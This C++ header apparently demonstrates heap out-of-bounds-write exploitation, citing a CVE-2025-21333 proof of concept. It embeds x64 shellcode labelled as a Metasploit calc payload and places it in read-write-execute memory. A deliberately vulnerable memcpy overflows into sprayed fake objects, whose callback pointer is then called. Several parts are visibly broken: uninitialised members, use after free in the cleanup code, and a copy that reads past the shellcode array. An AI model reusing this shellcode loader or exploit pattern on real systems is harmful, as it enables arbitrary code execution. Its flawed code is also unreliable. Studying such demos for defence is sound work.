#pragma once

#ifndef VULN_OOBW_EXPLOITATION
#define VULN_OOBW_EXPLOITATION
#endif


#include "log.hpp"
#include "common.hpp"

#define BUF_SIZE 300
#define FAKEOBJ_MAGIC 'fake'

#define ERROR_FAKEOBJ_MAGIC_MISMATCH 0x40000023

BYTE* payload;
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

namespace Vuln {
	namespace OutofBoundWrite {

		/**
		*
		* https://github.com/MrAle98/CVE-2025-21333-POC
		*
		* consider the following four situations:
		* 1. heap overflow   arbitrary data and arbitrary size
		* 2. heap overflow   arbitrary data and limited size
		* 3. heap overflow   limited range data and unlimited size
		* 4. heap overflow   limited range data and limited size
		* 
		* this time we will play 1 situations
		*/

		// out-of-bound write  struct object
		typedef struct _oobw_attack_target_obj {
			unsigned int id;
			void* addr;
		}oobw_attack_target_obj, *poobw_attack_target_obj;

		// fake object for attacking
		// 1. trigger the vuln  out-of-write  oobw_attack_target_obj memory boundary to arrive  oobw_victim
		typedef struct _oobw_fake_obj {
			int magic;
			unsigned int size;
			void* callback;
		}oobw_fake_obj, * poobw_fake_obj;

		/*
			heap overflow exploitation primitive
		*/
		class FakeObjExploitation
		{
		public:
			ERROR_T CheckMagic(oobw_fake_obj* obj);
			ERROR_T ReadMem(oobw_fake_obj* obj, void** buf, unsigned int size);
			ERROR_T WriteMem(oobw_fake_obj* obj, void* buf, unsigned int size);
			ERROR_T Trigger(oobw_fake_obj* obj);
		};

		ERROR_T FakeObjExploitation::CheckMagic(oobw_fake_obj* obj) {
			return 0;
		}
		ERROR_T FakeObjExploitation::ReadMem(oobw_fake_obj* obj, void** buf, unsigned int size) {
			if (obj->magic != FAKEOBJ_MAGIC) {
				return ERROR_FAKEOBJ_MAGIC_MISMATCH;
			}
			return 0;
		}
		ERROR_T FakeObjExploitation::WriteMem(oobw_fake_obj* obj, void* buf, unsigned int size) {
			if (obj->magic != FAKEOBJ_MAGIC) {
				return ERROR_FAKEOBJ_MAGIC_MISMATCH;
			}
			return 0;
		}
		ERROR_T FakeObjExploitation::Trigger(oobw_fake_obj* obj) {
			if (obj->magic != FAKEOBJ_MAGIC) {
				return ERROR_FAKEOBJ_MAGIC_MISMATCH;
			}
			typedef VOID(*exec)();
			exec exe = (exec)obj->callback;
			exe();
			return 0;
		}

		class HeapOverflowExploitation
		{
		public:
			HeapOverflowExploitation();
			~HeapOverflowExploitation();
		public:
			ERROR_T Execute(V_PARAS* args);
		private:
			ERROR_T VulnFunc_FULL(void* data, int size);
			oobw_attack_target_obj* _obj;
			UINT64 BufPOOL;
		private:
		};

		HeapOverflowExploitation::HeapOverflowExploitation()
		{
		}


		HeapOverflowExploitation::~HeapOverflowExploitation()
		{
			if (_obj) {
				free(_obj);
				_obj = NULL;
			}

			if (BufPOOL) {
				free((void*)BufPOOL);
			}
		}



		ERROR_T HeapOverflowExploitation::Execute(V_PARAS* args) {
			// 1. alloc regular object
			_obj = (oobw_attack_target_obj*)malloc(sizeof(oobw_attack_target_obj));
			_obj->addr = malloc(0x10);
			_obj->id = 0;

			// 2  init shellcode   msf/calc  x64 shellcode
			payload = (BYTE*)malloc(BUF_SIZE);
			memcpy(payload, buf, sizeof(buf));

			// 3. alloc memory pool in order to our fakeobj alloc located adjacent regular object
			// expection memory map
			/*
			*						  overflow	
			*							occur
				[oobw_attack_target_obj] [oobw_fake_obj] [oobw_attack_target_obj] [oobw_fake_obj] [oobw_attack_target_obj] [oobw_fake_obj]
				[oobw_attack_target_obj] [oobw_fake_obj] [oobw_attack_target_obj] [oobw_fake_obj] [oobw_attack_target_obj] [oobw_fake_obj]
				[oobw_attack_target_obj] [oobw_fake_obj] [oobw_attack_target_obj] [oobw_fake_obj] [oobw_attack_target_obj] [oobw_fake_obj]
				[oobw_attack_target_obj] [oobw_fake_obj] [oobw_attack_target_obj] [oobw_fake_obj] [oobw_attack_target_obj] [oobw_fake_obj]

			*/
			void* finnal_payload = malloc(sizeof(oobw_attack_target_obj) * 100 + sizeof(oobw_fake_obj) * 100);
			memcpy(finnal_payload, _obj, sizeof(oobw_attack_target_obj));

			// 4. heap fengshui to set attack_target object memory location and fakeobj memory (exploitation primitive)
			for (size_t i = 0; i < 100; i++)
			{
				oobw_fake_obj* fakeobj = (oobw_fake_obj*)malloc(sizeof(oobw_fake_obj));
				fakeobj->magic = FAKEOBJ_MAGIC;
				fakeobj->callback = VirtualAlloc(NULL, BUF_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				fakeobj->size = BUF_SIZE;
				memcpy(fakeobj->callback, payload, BUF_SIZE);
				memcpy((void*)((UINT64)finnal_payload + sizeof(oobw_attack_target_obj) + sizeof(oobw_fake_obj) * i), fakeobj, sizeof(oobw_fake_obj));


				oobw_attack_target_obj* regularobj = (oobw_attack_target_obj*)malloc(sizeof(oobw_attack_target_obj));
				regularobj->addr = malloc(0x10);
				regularobj->id = 0;
				memcpy((void*)((UINT64)finnal_payload + sizeof(oobw_attack_target_obj) * (i+1) + sizeof(oobw_fake_obj) * i), fakeobj, sizeof(oobw_fake_obj));
			}


			// 5. write data to trigger oob-write vuln, we could send our fakeobj into overflow memory accurately
			/*
				memory map
								
				[regular memory] ...>overflow here  [fakeobj memory]
			*/
			VulnFunc_FULL(finnal_payload, sizeof(oobw_attack_target_obj) + sizeof(oobw_fake_obj));

#ifdef SECURE
			// nothing
#else
			// 6. we could take a vuln exploitation trigger based on fakeobj
			/*
				In general, we could check syscall function by reverse engineing to search  call [rax] to achive Arbitrary Code Execute
				That's mean fakeobj exists some techniques to r/w memory or execute shellcode
				such as  ReadFile/WriteFile to exploit named pipe handle
			*/
			FakeObjExploitation* exp = new FakeObjExploitation();
			oobw_fake_obj* fakeobj = (oobw_fake_obj*)((UINT64)BufPOOL + sizeof(oobw_attack_target_obj));
			if (ERROR_FAKEOBJ_MAGIC_MISMATCH == exp->Trigger(fakeobj)) {
				EPrint("exploit failed\n")
			}
			else
			{
				DPrint("trigger succ\n");
			}

			// :|  clear resources
			free(fakeobj);
			free(finnal_payload);
			delete exp;
			free(payload);
			VirtualFree(fakeobj->callback, BUF_SIZE, MEM_DECOMMIT);
#endif
			return 0x40000001;
		}

		ERROR_T HeapOverflowExploitation::VulnFunc_FULL(void* data, int size) {
			BufPOOL = (UINT64)malloc(sizeof(oobw_attack_target_obj));
			memcpy((void*)BufPOOL,data,size);
			return 0;
		}
	}
}